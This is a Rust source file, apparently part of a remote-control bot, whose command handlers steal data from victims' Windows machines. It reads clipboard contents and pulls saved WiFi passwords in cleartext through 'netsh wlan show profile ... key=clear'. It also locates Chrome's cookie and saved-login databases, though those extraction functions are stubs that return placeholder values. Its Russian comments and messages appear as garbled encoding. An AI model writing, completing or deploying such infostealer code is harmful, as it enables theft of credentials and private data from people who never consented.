use anyhow::{Result, Context};
use tokio::process::Command as AsyncCommand;

use crate::device_manager::DeviceManager;

/// –í—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–º–∞–Ω–¥—É /cookies - –∏–∑–≤–ª–µ–∫–∞–µ—Ç cookies –∏–∑ –±—Ä–∞—É–∑–µ—Ä–æ–≤
pub async fn handle_cookies_command(device_manager: &DeviceManager, device_id: &str) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ —Å ID {} –Ω–µ –Ω–∞–π–¥–µ–Ω–æ", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    #[cfg(windows)]
    {
        let mut result = String::from("üç™ Cookies –∏–∑ –±—Ä–∞—É–∑–µ—Ä–æ–≤:\n\n");
        
        // Chrome cookies
        if let Ok(chrome_cookies) = extract_chrome_cookies().await {
            result.push_str(&format!("üîµ Chrome: {} cookies –Ω–∞–π–¥–µ–Ω–æ\n", chrome_cookies.len()));
        }
        
        // Firefox cookies
        if let Ok(firefox_cookies) = extract_firefox_cookies().await {
            result.push_str(&format!("üü† Firefox: {} cookies –Ω–∞–π–¥–µ–Ω–æ\n", firefox_cookies.len()));
        }
        
        // Edge cookies
        if let Ok(edge_cookies) = extract_edge_cookies().await {
            result.push_str(&format!("üî∑ Edge: {} cookies –Ω–∞–π–¥–µ–Ω–æ\n", edge_cookies.len()));
        }
        
        Ok(result)
    }
    
    #[cfg(not(windows))]
    {
        Err(anyhow::anyhow!("–ò–∑–≤–ª–µ—á–µ–Ω–∏–µ cookies –ø–æ–∫–∞ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –Ω–∞ Windows"))
    }
}

/// –í—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–º–∞–Ω–¥—É /weblogins - –∏–∑–≤–ª–µ–∫–∞–µ—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–µ –ª–æ–≥–∏–Ω—ã –∏–∑ –±—Ä–∞—É–∑–µ—Ä–æ–≤
pub async fn handle_weblogins_command(device_manager: &DeviceManager, device_id: &str) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ —Å ID {} –Ω–µ –Ω–∞–π–¥–µ–Ω–æ", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    #[cfg(windows)]
    {
        let mut result = String::from("üîê –°–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–µ –ª–æ–≥–∏–Ω—ã:\n\n");
        
        // Chrome passwords
        if let Ok(chrome_logins) = extract_chrome_passwords().await {
            result.push_str(&format!("üîµ Chrome: {} –ø–∞—Ä–æ–ª–µ–π –Ω–∞–π–¥–µ–Ω–æ\n", chrome_logins.len()));
            for login in chrome_logins.iter().take(5) { // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–µ—Ä–≤—ã–µ 5
                result.push_str(&format!("  ‚Ä¢ {} - {}\n", login.url, login.username));
            }
        }
        
        // Firefox passwords
        if let Ok(firefox_logins) = extract_firefox_passwords().await {
            result.push_str(&format!("\nüü† Firefox: {} –ø–∞—Ä–æ–ª–µ–π –Ω–∞–π–¥–µ–Ω–æ\n", firefox_logins.len()));
            for login in firefox_logins.iter().take(5) {
                result.push_str(&format!("  ‚Ä¢ {} - {}\n", login.url, login.username));
            }
        }
        
        Ok(result)
    }
    
    #[cfg(not(windows))]
    {
        Err(anyhow::anyhow!("–ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –ø–∞—Ä–æ–ª–µ–π –ø–æ–∫–∞ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –Ω–∞ Windows"))
    }
}

/// –í—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–º–∞–Ω–¥—É /wifiprofiles - –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–µ WiFi –ø—Ä–æ—Ñ–∏–ª–∏
pub async fn handle_wifiprofiles_command(device_manager: &DeviceManager, device_id: &str) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ —Å ID {} –Ω–µ –Ω–∞–π–¥–µ–Ω–æ", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    #[cfg(windows)]
    {
        // –ü–æ–ª—É—á–∞–µ–º —Å–ø–∏—Å–æ–∫ WiFi –ø—Ä–æ—Ñ–∏–ª–µ–π
        let output = AsyncCommand::new("netsh")
            .args(&["wlan", "show", "profiles"])
            .output()
            .await
            .context("–ù–µ —É–¥–∞–ª–æ—Å—å –≤—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É netsh")?;
            
        let profiles_output = String::from_utf8_lossy(&output.stdout);
        let mut result = String::from("üì∂ WiFi –ø—Ä–æ—Ñ–∏–ª–∏:\n\n");
        
        let mut profile_count = 0;
        
        for line in profiles_output.lines() {
            if line.contains("All User Profile") {
                if let Some(profile_name) = line.split(':').nth(1) {
                    let profile_name = profile_name.trim();
                    profile_count += 1;
                    
                    // –ü–æ–ª—É—á–∞–µ–º –ø–∞—Ä–æ–ª—å –¥–ª—è –ø—Ä–æ—Ñ–∏–ª—è
                    if let Ok(password) = get_wifi_password(profile_name).await {
                        result.push_str(&format!("üîπ {}: {}\n", profile_name, password));
                    } else {
                        result.push_str(&format!("üîπ {}: [–ø–∞—Ä–æ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω]\n", profile_name));
                    }
                }
            }
        }
        
        if profile_count == 0 {
            result.push_str("–ü—Ä–æ—Ñ–∏–ª–∏ WiFi –Ω–µ –Ω–∞–π–¥–µ–Ω—ã");
        }
        
        Ok(result)
    }
    
    #[cfg(not(windows))]
    {
        Err(anyhow::anyhow!("WiFi –ø—Ä–æ—Ñ–∏–ª–∏ –ø–æ–∫–∞ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞—é—Ç—Å—è —Ç–æ–ª—å–∫–æ –Ω–∞ Windows"))
    }
}

/// –í—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–º–∞–Ω–¥—É /getclipboard - –ø–æ–ª—É—á–∞–µ—Ç —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞
pub async fn handle_getclipboard_command(device_manager: &DeviceManager, device_id: &str) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ —Å ID {} –Ω–µ –Ω–∞–π–¥–µ–Ω–æ", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    #[cfg(windows)]
    {
        use clipboard_win::{Clipboard, formats};
        
        let _clip = Clipboard::new().map_err(|e| anyhow::anyhow!("–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–∫—Ä—ã—Ç—å –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞: {:?}", e))?;
        
        // –ü—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å —Ç–µ–∫—Å—Ç
        if let Ok(text) = clipboard_win::get_clipboard::<String, _>(formats::Unicode) {
            if text.is_empty() {
                return Ok("üìã –ë—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞ –ø—É—Å—Ç".to_string());
            }
            
            let preview = if text.len() > 200 {
                format!("{}...", &text[..200])
            } else {
                text.clone()
            };
            
            Ok(format!("üìã –°–æ–¥–µ—Ä–∂–∏–º–æ–µ –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞ ({} —Å–∏–º–≤–æ–ª–æ–≤):\n\n{}", text.len(), preview))
        } else {
            Ok("üìã –ë—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞ –Ω–µ —Å–æ–¥–µ—Ä–∂–∏—Ç —Ç–µ–∫—Å—Ç–∞".to_string())
        }
    }
    
    #[cfg(not(windows))]
    {
        Err(anyhow::anyhow!("–ë—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞ –ø–æ–∫–∞ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –Ω–∞ Windows"))
    }
}

// –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã
#[derive(Debug)]
struct BrowserLogin {
    url: String,
    username: String,
    password: String,
}

#[derive(Debug)]
struct BrowserCookie {
    name: String,
    value: String,
    domain: String,
}

// –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏
async fn extract_chrome_cookies() -> Result<Vec<BrowserCookie>> {
    let user_dir = std::env::var("USERPROFILE").unwrap_or_default();
    let chrome_cookies_path = format!("{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", user_dir);
    
    if !std::path::Path::new(&chrome_cookies_path).exists() {
        return Ok(Vec::new());
    }
    
    // –ó–¥–µ—Å—å –±—É–¥–µ—Ç —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è —á—Ç–µ–Ω–∏—è SQLite –±–∞–∑—ã Chrome
    // –ü–æ–∫–∞ –≤–æ–∑–≤—Ä–∞—â–∞–µ–º –∑–∞–≥–ª—É—à–∫—É
    Ok(vec![BrowserCookie {
        name: "example".to_string(),
        value: "cookie_value".to_string(),
        domain: "example.com".to_string(),
    }])
}

async fn extract_firefox_cookies() -> Result<Vec<BrowserCookie>> {
    // –ê–Ω–∞–ª–æ–≥–∏—á–Ω–æ –¥–ª—è Firefox
    Ok(Vec::new())
}

async fn extract_edge_cookies() -> Result<Vec<BrowserCookie>> {
    // –ê–Ω–∞–ª–æ–≥–∏—á–Ω–æ –¥–ª—è Edge
    Ok(Vec::new())
}

async fn extract_chrome_passwords() -> Result<Vec<BrowserLogin>> {
    let user_dir = std::env::var("USERPROFILE").unwrap_or_default();
    let chrome_logins_path = format!("{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", user_dir);
    
    if !std::path::Path::new(&chrome_logins_path).exists() {
        return Ok(Vec::new());
    }
    
    // –ó–¥–µ—Å—å –±—É–¥–µ—Ç —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è —á—Ç–µ–Ω–∏—è –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã—Ö –ø–∞—Ä–æ–ª–µ–π Chrome
    // –ü–æ–∫–∞ –≤–æ–∑–≤—Ä–∞—â–∞–µ–º –∑–∞–≥–ª—É—à–∫—É
    Ok(vec![BrowserLogin {
        url: "https://example.com".to_string(),
        username: "user@example.com".to_string(),
        password: "[encrypted]".to_string(),
    }])
}

async fn extract_firefox_passwords() -> Result<Vec<BrowserLogin>> {
    // –ê–Ω–∞–ª–æ–≥–∏—á–Ω–æ –¥–ª—è Firefox
    Ok(Vec::new())
}

async fn get_wifi_password(profile_name: &str) -> Result<String> {
    let output = AsyncCommand::new("netsh")
        .args(&["wlan", "show", "profile", profile_name, "key=clear"])
        .output()
        .await
        .context("–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –ø–∞—Ä–æ–ª—å WiFi")?;
        
    let password_output = String::from_utf8_lossy(&output.stdout);
    
    for line in password_output.lines() {
        if line.contains("Key Content") {
            if let Some(password) = line.split(':').nth(1) {
                return Ok(password.trim().to_string());
            }
        }
    }
    
    Ok("[–ø–∞—Ä–æ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω]".to_string())
}